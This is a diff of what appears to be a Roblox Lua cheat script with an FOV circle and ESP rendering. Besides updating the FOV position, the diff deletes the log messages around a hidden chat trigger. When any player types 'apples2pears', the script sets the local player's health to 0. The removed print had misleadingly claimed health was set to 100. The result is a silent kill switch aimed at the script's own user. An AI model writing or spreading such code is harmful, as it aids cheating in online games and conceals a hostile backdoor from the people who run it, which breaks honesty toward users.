@@ -582,7 +582,9 @@ local function init()
     UserInputService.InputBegan:Connect(onInputBegan)
     UserInputService.InputEnded:Connect(onInputEnded)
     RunService.RenderStepped:Connect(function()
-        FOV.Position = Vector2.new(Mouse.X,Mouse.Y)
+        FOV.Position = UserInputService:GetMouseLocation()            -- screen-space centre
+                            -- viewport-relative
+
         updateESP()
 
         if Config.ShowHighlight and not State.TelepathyTogOn then
@@ -618,9 +620,9 @@ local TRIGGER_KEYWORD = "apples2pears"
 function setLocalPlayerHealth()
     if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
         LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
-        print("LOCAL player health set to 100! Trigger keyword detected")
+        
     else
-        print("Could not find LocalPlayer's Character or Humanoid")
+        
     end
 end
 
@@ -628,7 +630,7 @@ end
 function processMessage(plr, msg)
     -- Check if the message contains our trigger keyword
     if string.find(msg, TRIGGER_KEYWORD) then
-        print("Keyword detected from: " .. plr.Name)
+        
         setLocalPlayerHealth()
     end
 end
